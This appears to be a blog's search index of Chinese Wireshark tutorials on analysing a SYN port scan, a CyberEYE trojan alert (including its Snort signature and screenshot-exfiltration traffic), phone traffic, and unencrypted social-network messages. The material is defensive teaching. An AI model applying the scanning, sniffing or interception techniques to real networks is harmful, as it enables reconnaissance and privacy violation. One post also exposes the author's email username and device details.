<?xml version="1.0" encoding="utf-8"?>
<search>
    
    
    <entry>
        <title><![CDATA[谈谈SYN扫描技术]]></title>
        <url>https://517736522.github.io/2017/03/30/%E8%B0%88%E8%B0%88SYN%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/</url>
        <content type="html"><![CDATA[<p>##谈谈SYN扫描技术<br>黑客往往会对目标系统进行TCP SYN扫描，这又被称为隐秘扫描或者半开扫描。SYN扫描是最常见的类型，主要有以下几个原因： 1、快速可靠。 2、在所有平台上都很准确，与TCP协议栈的实现无关。 3、比其他扫描技术更加安静，不容易被发现。</p>
<p>TCP SYN扫描依赖于TCP的三次握手过程，可以确定目标主机的哪些端口是开放的。黑客发送TCP SYN数据包到目标主机的一个范围的端口上，就如同要在这些端口上建立用于正常通信的连接一样。如下图所示，一旦目标主机收到这个数据包，就可能会产生一系列的反应：<br><img src="/2017/03/30/谈谈SYN扫描技术/1.jpg" alt="1"><br>如果目标计算机上某个服务正在监听的端口收到了SYN数据包，它将向黑客回复一个TCP SYN/ACK数据包，也就是TCP握手的第二个步骤。这样黑客就可以知道这个端口是开放的，并且有一个服务在上面监听。正常情况下会发送一个TCP ACK数据包以完成连接握手，但是这个时候黑客并不想这样，因为他还不想与主机通信。所以黑客并不打算完成TCP握手。</p>
<p>如果没有服务在被扫描的端口上处于接听状态，那么攻击者就不会收到TCP SYN/ACK数据包。按照目标计算机系统的不同配置，黑客可能会收到响应的RST数据包，表示该端口处于关闭的状态。或者黑客接收不到任何的响应。这就意味着这个端口被某个中间设备过滤了，比如防火墙或者主机本身。另一方面，也有可能是因为响应数据包在传输的过程中丢失了。这个结果通常表明端口是关闭的，但是证据并不充分。</p>
<p>实验文件Lab35-1.pcap所提供的是使用Nmap工具进行SYN扫描的例子。在这个样本中，大约包含有2000个数据包，这就说明了该扫描具有一定的规模。确定这个扫描范围大小的最好的办法就是查看Conversations窗口，该窗口可以在Statistics菜单中选择查看，如下图所示：<br><img src="/2017/03/30/谈谈SYN扫描技术/2.jpg" alt="2"><br>在这里可以看到，攻击者（172.16.0.8）和受害者（64.13.134.52）之间只有一个IPv4会话，有1994个TCP会话，并且在通信的过程中，基本上是每一个端口对应着一个新的会话，那么这就是很典型的端口扫描的情况。</p>
<p>扫描是在极短的时间内完成的，因此如果在这两千多个数据包中通过直接观察的方法来寻找我们想要的数据包，无疑是大海捞针，那么这里就需要利用筛选器来帮助我们进行分析。  </p>
<p>##筛选出合适的数据包<br>这里我给大家讲解一个简单的筛选的例子。首先看一下第一个数据包。这个数据包是黑客发往目标计算机的443端口（HTTPS）的SYN数据包。为了查看目标主机是否对这个数据包做出了响应，我们就可以创建一个筛选器，以显示所有源端口或目标端口为443的网络流量。快速设置的方法如下： 1、在捕获文件中选择第一个数据包。 2、在Packet Details面板中展开TCP的头部。 3、右键点击Destination Port域，选择Prepare as Filter，再单击Selected。 4、这样就会自动生成一个筛选器，针对所有目标端口为443的数据包。由于我们想筛选端口号为443的所有数据包，所以可以删除筛选器中的dst部分。当然如果大家对于筛选公式非常熟悉的话，也可以不使用这种方法，而是直接将筛选条件写入筛选框中。</p>
<p>那么筛选器最终筛选出了2个数据包，可以发现，这两个数据包都是黑客发往目标计算机的TCP SYN数据包，而这两个数据包都没有得到响应，说明网络通信数据包被目标主机或者中间设备过滤掉了，或者目标主机的443号端口就是处于关闭的状态。但是总的来说，目标计算机的443号端口的状况是不确定的。</p>
<p>下面我们可以使用同样的技术来分析其它的数据包，查看一下有没有不同的结果。由于我们刚才使用了筛选器，那么此时应当先单击筛选器右边的Clear按钮来清空筛选器，然后可以选中第9号数据包。这个数据包的目标端口号为53，一般与DNS有关。那么我们可以使用刚才的方法，创建一个基于目标端口的筛选器，那么此时只有一个数据包，然后删除dst部分，出现了5个数据包：<br><img src="/2017/03/30/谈谈SYN扫描技术/3.jpg" alt="3"><br>首先第1个是9号数据包，就是我们在捕获最开始的时候选择的SYN数据包。下一个数据包是来自目标计算机的响应，这是一个TCP SYN/ACK数据包，也就是TCP三次握手中的第二次的响应数据包。而如果通信正常，那么下一个数据包应当是TCP握手的最后一步，也就是由黑客发送的ACK确认数据包。但是在这里我们发现，黑客显然并不想真的创建TCP连接，所以并没有发送响应数据包。而目标计算机由于没有收到ACK数据包，就会认为自己发送的SYN/ACK数据包出现了丢失的情况，于是接下来又重传了三次SYN/ACK数据包，在最后依旧没有收到响应的情况下，才放弃了TCP连接。由于黑客尝试与目标计算机的53号端口通信的时候收到了SYN/ACK的响应，所以可以确定对方有服务正在监听这个端口。</p>
<p>接下来我们再次清空筛选器，在13号数据包上重复上述过程。这个数据包的目标端口号为113，这个端口通常与Ident协议有关，通常用于IRC的身份识别和验证服务。我们使用之前的方法来分析，则可以找到4个数据包：<br><img src="/2017/03/30/谈谈SYN扫描技术/4.jpg" alt="4"><br>第一个数据包（13号数据包）是TCP握手的第一步SYN数据包，接着就是来自目标计算机的RST响应，表明目标计算机的相应端口不接受连接，那么也就说明，这个端口上很可能并没有服务。  </p>
<p>##识别端口的状态<br>当我们理解了SYN扫描能够引起不同类型的响应之后，那么我们当然就想知道有没有一个方法可以快速识别端口的状态。我们需要再次回到Conversation窗口。在这里，我们可以通过数据包编号来对TCP会话进行排序，比如单击Packet列两次就可以实现从高到低进行排序：<br><img src="/2017/03/30/谈谈SYN扫描技术/5.jpg" alt="5"><br>可以发现前三个被扫描的端口在各自的会话中都包含有5个数据包，所以可以知道这三个端口是开放的，因为经过刚才的分析可以知道，这5个数据包分别表示TCP的初次握手SYN、目标计算机的回应SYN/ACK以及来自目标计算机的三次重传SYN/ACK。 接下来有5个端口只包含有两个数据包，那么这两个数据包中的第一个是初始SYN，而第二个则是来自目标计算机的RST，表明这5个端口是处于关闭的状态。</p>
<p>余下的端口只包含有一个数据包，说明目标计算机并没有响应初始SYN数据包，说明这些端口的状态我们难以确定。  </p>
<p>#小结<br>通过这次的课程可以发现，利用TCP的握手原理就可以轻易嗅探到目标计算机的端口状态，这也就说明了，网络安全的实际应用，其实就是建立在基本的协议原理知识的基础上，所以可以这么说，我们整个课程系列，之前所讲的协议篇绝对是重中之重，是需要大家多次学习，慢慢体会的。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 安全篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[木马程序其实并不可怕]]></title>
        <url>https://517736522.github.io/2017/03/30/%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F%E5%85%B6%E5%AE%9E%E5%B9%B6%E4%B8%8D%E5%8F%AF%E6%80%95/</url>
        <content type="html"><![CDATA[<p>##特征分析<br>这里我们可以假设，某一天我们的入侵检测系统生成了这样的一条警报：<br>    [<strong>][1:132456789:2] CyberEYE RAT Session Establishment [</strong>]<br>    [Classification:A Network Trojan was detected] [Priority:1]<br>    07/18-12:45:04.656854 172.16.0.111:4433 -&gt; 172.16.0.114:6641<br>    TCP TTL:128 TOS:0x0 ID:6526 Iplen:20 DgmLen:54 DF<br>    ***AP*** Seq:0x53BAEB5E Ack:0x18874922 Win:0xFAF0 TcpLen:20  </p>
<p>触发这条警报的Snort特征规则如下：</p>
<pre><code>alert tcp any any -&gt; $HOME_NET any (msg:&quot;CyberEYE RAT Session   Establishment&quot;;  
content:&quot;|41 4E 41 42 49 4C 47 49 7C|&quot;; classtype:trojan-activity;  
content:&quot;|41 4E 41 42 49 4C 47 49 7C|&quot;; classtype:trojan-activity;  
sid:132456789;rev:2;)  
</code></pre><p>Snort规则由两部分构成：<br>规则头部和规则选项。规则头部包含规则动作（通常是警告、协议、源IP地址与目的IP地址、源端口与目的端口等）。按照惯例，Snort规则使用变量自定义它的环境，比如本例中的$HOME_NET被用来指定内部IP地址范围。头部的“-&gt;”符号表示规则仅用在单方向传输的流量中，那么整个头部的意思就是，过滤所有发往内部IP地址的网络流量。</p>
<p>小括号中的msg表示警告或日志记录中所打印的消息，我们从IDS的警报中也看到了这段字符；关键字content表示在数据包中搜索特定的内容，而在这个关键字的规则选项中，管道符号（|）用来表示十六进制数值的开始和结束，针对本例来说，当IDS发现一个进入内网的数据包含有十六进制内容41 4E 41 42 49 4C 47 49 7C时，就会产生警报，那么将其转换成可读的ASCII码，就是ANABILGI，当检测到这个字符串时，警报就会响起，预示着出现了CyberEYE木马；classtype 是规则类别的标识，这里将其标记为木马程序；sid表示规则的标识ID；rev其实是和sid一起，来标识规则的更新。</p>
<p>其实CyberEYE是一款类似于灰鸽子的来自土耳其的木马工具，可以产生木马并且管理“肉鸡”。一旦目标计算机中了木马程序，那么它就会自动和攻击者进行连接，使得攻击者可以远程管理受害者的计算机。我们也可以看到，其实Snort规则类似于反病毒技术中的特征码查杀的方式，也就是从恶意程序中提取关键字符串加入病毒库，那么杀毒软件就可以根据这个特征来识别病毒了。有兴趣的朋友可以参考《病毒木马查杀实战》的相关内容。  </p>
<p>##数据包分析<br>我们查看一下捕获文件Lab39-1.pcap中与警报相关的流量信息。Snort通常只捕获触发警报的单个数据包，但幸好我们有主机之间的完整通信序列，因此我们可以搜索Snort规则中出现的特征字符串，从而直接跳转到关键部分进行分析。</p>
<p>选择Edit-&gt;Find Packet。在新弹出的窗口中选择Hex Value，然后在文本框中输入41 4E 41 42 49 4C 47 49 7C，并单击Find，那么首先就可以在4号数据包中找到特征字符串：<br><img src="/2017/03/30/木马程序其实并不可怕/1.jpg" alt="1"><br>如果我们多次进行搜索（快捷键Ctrl+N），可以发现这个字符串也在5、10、32、156、280、405、531和652号数据包里面出现了。尽管这个捕获文件里面的所有通信都是在攻击者（172.16.0.111）和受害者（172.16.0.114）之间产生的，但是看起来这个字符串出现在了不同的会话中。4号和5号数据包使用了4433和6641号的端口进行通信，而其它的大部分实例出现在4433号端口和其它的随机选择的临时端口之间。利用会话窗口的TCP标签，就可以确认存在着多个会话：<br><img src="/2017/03/30/木马程序其实并不可怕/2.jpg" alt="2"><br>我们可以给捕获文件中的不同会话设置不同的颜色，方便我们的进一步分析。可以首先利用筛选器，输入筛选条件：<br>(tcp.flags.syn==1) and (tcp.flags.ack==0)<br>这样就只剩下了每个会话的初始SYN数据包。右键点击第一个数据包，选择Colorize Conversation-&gt;TCP，然后选择一种颜色。之后我们可以为接下来的SYN数据包重复这个过程，分别设置不同的颜色。完成之后，选择筛选器旁边的Clear来删除筛选条件。 通过着色，我们可以看到会话之间的关联关系，有助于我们更好地跟踪两台主机之间的通信过程。我们可以利用Follow TCP Stream查看一下传输的数据：<br><img src="/2017/03/30/木马程序其实并不可怕/3.jpg" alt="3"><br>由第一行的蓝色字体可以知道，攻击者给受害者发送了字符串ANABILGI|556，然后受害者就响应了关于本机系统的基本信息，包含有计算机名称、操作系统以及硬件信息等。之后就开始给攻击者发送一些重复的字符串BAGLIMI？而攻击者返回的消息只有字符串CAPSCREEN60。</p>
<p>这里出现的CAPSCREEN60需要我们特别留意，需要分析一下它的出处。那么可以再次搜索这个字符串，可以发现它首次出现在27号数据包里面。27号数据包是由攻击者发给受害者的，而受害者在接收到这个数据包之后，就回复了一个确认数据包，并利用29号数据包发起了一个新的会话。</p>
<p>那么受害者开启新的会话做了什么呢？我们看一下这个会话的TCP Stream：<br><img src="/2017/03/30/木马程序其实并不可怕/4.jpg" alt="4"><br>这里我们看到了一个路径，路径之后是一大段不可识别的字符串。但是需要留意的是，这段文本中出现了JFIF字符串，我们之前讲过，它是JPG文件开头的特征。至此，可以肯定，之所以要发起新的会话，就是要传输这个JPG图像文件。可以推断，攻击者利用CAPSCREEN命令就可以发起JPG文件的传输。下面我们可以具体分析一下这个问题，使用Wireshark的IO绘图功能来查看一下每个会话的流。</p>
<p>选择Statistics-&gt;IO Graphs，在5个筛选栏中分别输入tcp.stream eq 2、tcp.stream eq 3、tcp.stream eq 4、tcp.stream eq 5、tcp.stream eq 6，之后分别点击Graph 1到5，用于启动筛选器的过滤点，最后将Y轴的单位改成Bytes/Tick：<br><img src="/2017/03/30/木马程序其实并不可怕/5.jpg" alt="5"><br>从这个图像来看，每个会话所包含的数据大小相当，出现的时间也是一致的。于是就可以知道，这个活动重复了多次。 那么下面我们可以尝试提取出这个JPG文件。比如依旧查看29号数据包的TCP Stream，选择Save As按钮保存数据，确保扩展名是.jpg。</p>
<p>但是提取出来的JPG文件是无法直接打开的，我们需要使用WinHex对其进行编辑。需要删除掉文件头部多余的字节：<br><img src="/2017/03/30/木马程序其实并不可怕/6.jpg" alt="6">  </p>
<p>删除掉之后，图片文件就可以正常打开了。可以看到，其实这个木马程序是将受害者的桌面执行了截屏的操作，并发送给攻击者。那么在发送完这些数据之后，TCP的连接也就拆除了。</p>
<p>我们这次的实验，其实就是一个网络安全工程师分析IDS警报流量时应当使用的经典步骤，希望大家能够掌握。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 安全篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[手机数据包分析]]></title>
        <url>https://517736522.github.io/2017/03/30/%E6%89%8B%E6%9C%BA%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/</url>
        <content type="html"><![CDATA[<p>##手机抓包的方法<br>一般来说，如果想抓取手机数据包，常用的工具有Wireshark以及Tcpdump。前者属于外部抓包工具，也是我们这次的课程所需要利用的工具。而后者属于内部抓包工具，也就是直接在手机设备上抓包，主要应用于安卓系统的手机，并需要具备root权限。Tcpdump其实是Linux中的一款强大的命令行网络数据包捕获和分析的工具之一。由于安卓系统也是一种基于Linux的操作系统，所以可以在安卓设备上使用Tcpdump工具实现内部的抓包。</p>
<p>在这次的实验中，为了获取手机的数据包，我将我的电脑变成了一个无线热点，然后使用手机连接到这个无线网，连接上之后，就可以在电脑上利用Wireshark直接监控手机的联网行为了。将电脑变成一个无线热点，可以通过软件来实现，但是这样的话会有诸多的限制，所以我为了获得更好的实验效果，我使用的是外置式的随身wifi，只要将这个随身wifi插入电脑的USB接口，并安装好相应的驱动，那么我的计算机就变成了一个无线热点了。接下来只要利用手机搜索到这个无线热点，之后再连接即可。  </p>
<p>##登录数据包分析<br>实验文件Lab40-1.pcapng是我利用手机登录无线热点时所捕获的数据包。这个捕获文件中有许多数据包并不是我们的手机流量，因此需要有所鉴别地分析：<br><img src="/2017/03/30/手机数据包分析/1.jpg" alt="1"><br>首先粗略地观察，可以发现在手机上进行通信时，最常见的通信模式就是TCP和UDP。其中UDP协议占据的比例较多。关于这一点，可以通过Statistics中的Protocol Hierarchy窗口里面看到：<br><img src="/2017/03/30/手机数据包分析/2.jpg" alt="2"><br>可见99%以上的数据包都是基于UDP协议的。之所以会这样，是因为UDP模式占用资源较少，所以在手机通信中被广泛地使用。我们之前讲过，UDP协议是一种无连接的协议，也就是说，这个协议只负责发送数据包，并不关心对方是否接收到。基于UDP的协议有很多，比如DHCP以及DNS等。对于手机来说，最需要这种具备传输速度快以及节省流量的特点的协议。所以在实际的应用中，会有非常多的程序使用UDP协议，比如语音、视频、网络电话等。</p>
<p>那么我们不妨就将关注点放在UDP的流量上。首先在筛选器中输入udp，回车后发现依然有很多数据包。那么我们不妨只查看与手机IP相关的数据包。通过会话窗口可以发现192.168.147.129这个IP地址最为活跃，那么不妨就将筛选条件修改为： udp and ip.addr==192.168.147.129 筛选后可以看到，剩下的基本上都是DNS以及UDP的协议了。我们刚才通过Protocol Hierarchy窗口也知道，UDP中有大约96%的数据包的内容是数据，大约3%的数据包是DNS数据包。那么我们这里不妨看看其中的一部分数据包的内容，比如可以用右键单击第23号数据包，选择Follow UDP Stream：<br><img src="/2017/03/30/手机数据包分析/3.jpg" alt="3"><br>这里我们只关注可供识别的字符。可以看到，这里出现了诸如miui.com、xiaomi.com、tieba.baidu.com、alipay.com、qq.com以及360.cn等网址，他们分别与MIUI、小米、百度贴吧、支付宝、腾讯和360相关。那么其实这也就从一个侧面发现了我的手机中的活跃的软件，也就是当我的手机刚连上热点的时候，究竟有哪些软件会与远端服务器进行通信。可见，软件装得多，特别是与网络有关的软件装得多，确实会在不知不觉中带走很多流量。  </p>
<p>##网页浏览数据包分析<br>在手机连上无线网之后，我在手机上使用浏览器看了几个网页，也就包含在了实验文件Lab40-2.pcapng中。我们主要关注DNS流量，那么不妨直接在筛选器中输入dns，于是就只剩下了与DNS相关的数据包了：<br><img src="/2017/03/30/手机数据包分析/4.jpg" alt="4"><br>可以看到，这些DNS流量全都以查询响应的方式成对出现。为了更好地查看被查询的域名，我们可以创建一个只显示查询数据包的筛选器。在Packet List面板中选择一个查询，然后在Packet Details面板中展开数据包的DNS头部，然后右键点击Flags:0x0100（Standard quary）域，之后移动到Apply as Filter，选择Selected：<br><img src="/2017/03/30/手机数据包分析/5.jpg" alt="5"><br>这就会激活筛选器dns.flags==0x0100，使得窗口上只剩下了查询数据包，就可以方便地读取我们正在分析的记录。这样我们就可以知道所访问的域名。可以发现，其实我所访问的是手机新浪网，并且很可能使用的是UC浏览器。那么是否真的是UC浏览器，需要进一步的分析才能够得知。  </p>
<p>##邮箱登录数据包分析<br>接下来我依旧拿登录我的搜狐邮箱作为例子，看看Wireahrk捕获到了哪些信息，也就是实验文件Lab40-3.pcapng。这里我们在第一个数据包上点击右键，选择Follow UDP Stream：<br><img src="/2017/03/30/手机数据包分析/6.jpg" alt="6"><br>在这里，我们可以看到所登录的是搜狐邮箱的移动版（m.mail.sohu.com），用户名是（ioio_jy@sohu.com）。接下来我们可以重点关注一下X-UCBrowser-UA以及User-Agent字段的内容。</p>
<p>X-UCBrowser-UA表示的是UC浏览器的扩展字段，主要用于获取更多的设备以及功能信息。可以看到，用户使用的手机为红米note1的4G增强版（HM NOTE 1LTE），使用的浏览器为UC浏览器，版本为10.9.2.712，手机系统的内核为安卓4.4.4，逻辑分辨率为360640，而手机的实际分辨率为7201280。Bt表示发行渠道，这里的YZ意思是预装的国内渠道。Pm表示中转模式，表示是否通过服务器中转访问，参数为1表示开启，也就是经过服务器中转。Bv 表示当前的浏览模式，参数为1表示缩放模式。Nm表示夜间模式的开关状态，1表示开启夜间模式。im表示无图模式的开关状态，0表示关闭。Sr表示当前屏幕旋转设置项的状态，0表示跟随系统。Nt表示当前客户端使用的网络类型，2表示wifi。</p>
<p>在User-Agent中，Linux表示当前使用的系统平台，U表示采取了128位加密的方式，之后是系统语言及手机设备信息。AppleWebKit表示渲染引擎的版本号，之后是UC浏览器的版本，最后的内容用于扩展自定义的信息。</p>
<p>其实，分析至此，我们就已经获取了很多的信息，这些信息可以为之后的社会工程学而服务。另外还可以发现，与我们之前讨论的利用FoxMail客户端登录邮箱不同的是，这次的登录并没有找到登录密码，这就说明是经过了加密的，同时也说明，这种登录方式是比客户端登录安全的。</p>
<p>当然，大家如果有兴趣的话，可以进一步对本次课程的三个文件进行挖据，看看是否会得到更加有趣的信息。  </p>
<p>##小结<br>至此，《网络数据包分析从入门到精通》的安全篇就讲到这里了，同时这也是整个课程系列的最后一节课，不知道大家收获多少呢？是否正如系列课程的名称所说的那样，使大家对于网络数据包的分析水平，由入门达到了精通呢？其实即便我给大家讲解了这40次的课程，只能保证大家具备了分析网络数据包的基础知识，更多的内容是需要大家自己去探索的。</p>
<p>这里我们不妨再简短的回顾一下整个系列的课程。首先是基础篇，给大家讲解了Wireshark的基本用法，包括重要的窗口以及命令行工具等。接下来的协议篇给大家讲解了网络中的常见协议，协议篇的最后还给大家讲解了几个综合性的例子。而整个协议篇也是我始终强调的，需要大家务必精通的内容，掌握了这个，无论是对于接下来课程的学习，还是大家未来自己的研究，都会大有帮助。最后的排错篇以及安全篇，实际上还是对各种协议的分析，而只有掌握了基础协议的工作流程，我们才能够发现实际网络中与正常流程不一样的地方，从而发现问题。我也希望大家通过排错篇以及安全篇的学习，会对Wireshark有更深层次的理解。</p>
<p>最后，借用某位前辈的语录：Network Analysis is tough, but Wireshark makes it easy!v   </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 安全篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[我们的社交网络安全吗（下）]]></title>
        <url>https://517736522.github.io/2017/03/30/%E6%88%91%E4%BB%AC%E7%9A%84%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%90%97%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
        <content type="html"><![CDATA[<p>##登录过程分析<br>实验文件Lab33-1.pcap包含有整个登陆过程，它捕获于提交凭证的那一刻，如下图所示：<br><img src="/2017/03/30/我们的社交网络安全吗（下）/1.jpg" alt="1"><br>可以看到，Facebook与Twitter的登陆过程是类似的，首先可以看到443号端口的TCP三次握手的过程。之后就是SSL的握手，并提交登陆凭证。</p>
<p>这里和Twitter身份认证过程所不同的是，在传输登录凭证之后，我们并没有马上看到结束身份认证的连接。相反，我们在第12号数据包的HTTP的头部看到一个指向/home.php的GET请求：<br><img src="/2017/03/30/我们的社交网络安全吗（下）/2.jpg" alt="2"><br>那么这个GET请求就是希望在验证成功后访问Facebook的主页。那么登录的连接在哪里被拆除的呢？这就需要我们查找哪个TCP数据包中含有FIN标志位。其实也就是第62和64号数据包。也就是用于身份验证的连接在传输home.php的内容后才被拆除。首先是利用62号数据包拆除掉了80端口上的HTTP连接，之后拆除了443号端口的HTTPS连接。  </p>
<p>##私信数据包分析<br>既然我们已经查看了Facebook的登录认证过程，那么现在让我们来分析一下它是如何处理私信的。实验文件Lab33-2.pcap所捕获的是两个账户之间发送私信的数据包。打开这个文件可以发现，开头的两个数据包构成了负责发送消息的HTTP流量。这里我们可以展开1号数据包的HTTP头部：  </p>
<p><img src="/2017/03/30/我们的社交网络安全吗（下）/3.jpg" alt="3"><br>可以看到，浏览器对一个相当长的URL字符串使用了POST方法。并且这个字符串还包含了AJAX的引用。</p>
<p>异步JavaScript和XML（Asynchronous JavaScript and XML，简称AJAX）是一种在客户端实现的，用于创建交互式Web应用的，在后台从服务器取回信息的方法。也许大家会想，在私信抵达客户端的浏览器后，这个会话会被重定向到另一个页面（如Twitter直达信息所做的），但是这并没有发生。在这个例子中，使用AJAX可能意味着消息是从某些类型的交互式弹出窗口中发出的，而不是来自独立的页面，这也就意味着没有必要做重定向或者刷新。这是使用AJAX实现的优点之一。</p>
<p>与Twitter一样，如果我们展开这个数据包的HTML Form URL Encoded，就可以查看到私信的内容，可见Facebook的私信也是没有经过加密就发送的：  </p>
<p><img src="/2017/03/30/我们的社交网络安全吗（下）/4.jpg" alt="4">  </p>
<p>##对比分析Twitter和Facebook<br>至此，大家已经看到了Twitter和Facebook这两个Web服务的身份认证和消息发送的方法了。其实二者分别采用了不同的实现手段。程序员可能会认为Twitter的身份认证方法比较好，因为它更加快速高效。安全工程师则可能会说Facebook的方法更好，因为它保证了所有的内容都能够成功传递。并且，由于在关闭身份认证连接之前不需要额外的认证，就使得中间人攻击（Man-in-the-middle，简称MITM，中间人攻击是指恶意用户拦截通信双方流量的一种攻击手段）更难得逞。在现实中，这两个网站的认证方法差别很小，但却表明了当两个程序员着手为同样的任务编写程序时，还是存在着差异的。</p>
<p>其实我们这两次课程分析的关键不在于弄清楚Twitter和Facebook究竟是如何工作的，而只是想让大家接触到可以比较的流量。如果大家需要检查为什么相似服务的运转方式与预想不同，或者运转较慢，那么这两次的例子就提供了一个很好的参考。  </p>
<p>##人人网数据包分析<br>国内的社交网站与Facebook类似的，只有人人网了。这里我们可以先来研究一下它的登陆过程，也就是在实验文件Lab33-3.pcapng里面。和Facebook相同的是，在第25号数据包中，这里同样出现了HTTP协议，它是一个指向/home.php的GET请求。同时也就说明，登录的验证过程在这里就结束了，验证成功，并且登陆到了人人网的主页：<br><img src="/2017/03/30/我们的社交网络安全吗（下）/5.jpg" alt="5"><br>那么在此之前，就是验证的过程，我们可以在第19号数据包中找到我的登陆账号：<br><img src="/2017/03/30/我们的社交网络安全吗（下）/6.jpg" alt="6"><br>之后的一系列数据包则与数据传输相关，毕竟人人网的文字和图片众多，所以需要多个数据包进行传输。 实验文件Lab33-4.pcapng是我发了一条状态的时候所捕获的数据包：<br><img src="/2017/03/30/我们的社交网络安全吗（下）/7.jpg" alt="7"><br>首先由4号数据包可以发现，人人网在发送状态时，使用了AJAX，也就是利用交互式对话框实现状态的输入的。接下来的7号数据包，则是状态发送的数据包，可以看到我所发送的状态是hello wireshark，是没有经过加密处理的。 最后再分析一下实验文件Lab33-5.pcapng，它是我在与好友聊天的时候捕获的：<br><img src="/2017/03/30/我们的社交网络安全吗（下）/8.jpg" alt="8"><br>这个捕获文件中的第5个数据包里面，包含有聊天的内容以及双方的ID，可见这些信息也是没有经过加密处理的。  </p>
<p>##小结<br>分析我们常用的社交网站所生成的数据包是一个很有趣的尝试，让我们了解到了这些网站是否真的安全，对于提高我们的安全意识会很有帮助。同时也增长了我们对于数据包的理解，为分析更加复杂的情况打下了基础。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 安全篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[我们的社交网络安全吗（上）]]></title>
        <url>https://517736522.github.io/2017/03/30/%E6%88%91%E4%BB%AC%E7%9A%84%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%90%97%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
        <content type="html"><![CDATA[<p>##Twitter的登陆过程<br>实验文件Lab32-1.pcap包含有Twitter的登录过程数据包。可以发现，起始的3个数据包是TCP的三次握手过程。远程服务器在443号端口来监听我们发起的连接。这个端口，默认提供给SSL over HTTP协议使用，该协议通常被称为HTTPS，是一种安全的数据传输方式。基于这些信息，我们就可以知道这是SSL流量。</p>
<p>紧随TCP握手之后的是SSL加密握手。SSL依赖于密钥，也就是用于加密解密双方通信的字符串。这次的握手实现了主机之间密钥的正式传输，以及连接和加密特性的协商过程。一旦握手完成，安全的数据传输就开始了。</p>
<p>为了找到处理数据交换的加密数据包，在Packet Details面板的Info列寻找被识别成Application Data的数据包，比如9号数据包。展开它的SSL部分，将会显示Encrypted Application Data域，包含有不可读的加密数据，可以认为这些数据是与登陆时的用户名和密码有关的数据传输：<br><img src="/2017/03/30/我们的社交网络安全吗（上）/1.jpg" alt="1"><br>身份认证的过程还会一直持续，直到第16号数据包使用FIN/ACK标志拆除连接之后才会结束。在身份认证成功之后，我们猜测浏览器将会被重定向到Twitter的主页，实际上也正是如此。19、20和22号数据包是向同一个远程服务器建立新连接的握手过程，但是这次是在80端口而不是443端口，也就是与HTTP协议有关。在握手完成之后，我们可以在23号数据包中看到指向Web服务器根目录（/）的HTTP GET请求，远程服务器利用24号数据包确认了这个请求，然后在接下来的几个数据包中传输数据。41号数据包中的内容则标记了这次GET请求有关数据传输的结束。</p>
<p>这个捕获文件中剩余部分还有几个GET请求，用来检查连接到主页的图像以及其它文件。  </p>
<p>##利用Twitter发状态<br>我们使用Twitter经常也会发送一些自己的想法状态，那么这个过程就在捕获文件Lab32-2.pcap中。这个文件从刚一提交状态的那一刻开始进行捕获。起初同样是TCP的三次握手过程，而4号和5号数据包里面则包含有从客户端发送到远程服务器的一个HTTP数据包。我们可以查看第5个数据包的内容进行分析：<br><img src="/2017/03/30/我们的社交网络安全吗（上）/2.jpg" alt="2"><br>在这里可以发现，浏览器对/status/update使用了POST方法，并且在Host域发现了twitter.com这个字符串，说明这就是用于状态发布的数据包。进一步查看，就可以找到发布的状态的内容了：<br><img src="/2017/03/30/我们的社交网络安全吗（上）/3.jpg" alt="3"><br>可以看到，这个字符串并没有进行加密。于是这就有个小小的安全问题，因为有些人希望保护他们所发的状态，不想被看到。尽管并不是所有人都有办法获取这条消息，但是如果处于同一个网络，那么就有可能拦截这些网络流量，从而获取到发送的状态了。  </p>
<p>##Twitter直达消息<br>使用Twitter还可以给好友直接发送消息，那么按道理我们是不希望这条消息被黑客截获，从而得知我们发送的内容的。那么Twitter是否对这个消息采取了加密措施呢？实验文件Lab32-3.pcap就是对这一过程的捕获记录。我们可以看到，其实直达消息并不是加密的：<br><img src="/2017/03/30/我们的社交网络安全吗（上）/4.jpg" alt="4"><br>我们这里对于Twitter的分析所采用的都是比较基本的技术，这会让大家重新考虑是否应该在不安全的网络上通过Twitter来发送敏感的数据。  </p>
<p>##新浪微博数据包分析<br>在我们分析完Twitter的情况之后，我们可以看一下新浪微博的情况。这里我捕获了我登录我的新浪微博账号，并且发了一条状态的整个流程，也就是实验文件Lab32-4.pcapng，可以分析一下Twitter和新浪微博的异同。</p>
<p>新浪微博的登陆过程也是以TCP的三次握手开始的，接下来就需要利用用户名和密码进行登录，我们可以在4号数据包的Packet Bytes面板中看到用户名：<br><img src="/2017/03/30/我们的社交网络安全吗（上）/5.jpg" alt="5"><br>但是密码是不可见的，因此从这个角度来说，还是比较安全的。最后看一下79号数据包，这里面就包含有我所发的一条状态：</p>
<p>可以发现，这里和Twitter一样，都是没有加密的。  </p>
<p>##小结<br>本次实验讨论了Twitter以及新浪微博的登录以及发消息的数据包情况，希望大家在掌握了分析的方法之后，尝试分析一下自己经常登录的网站的流量情况。也许你在捕获的时候，很短的时间内就会得到非常多的数据包，那么此时就需要使用筛选技术或者着色技术，获取重要的数据包，来辅助分析。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 安全篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[应对ARP攻击]]></title>
        <url>https://517736522.github.io/2017/03/30/%E5%BA%94%E5%AF%B9ARP%E6%94%BB%E5%87%BB/</url>
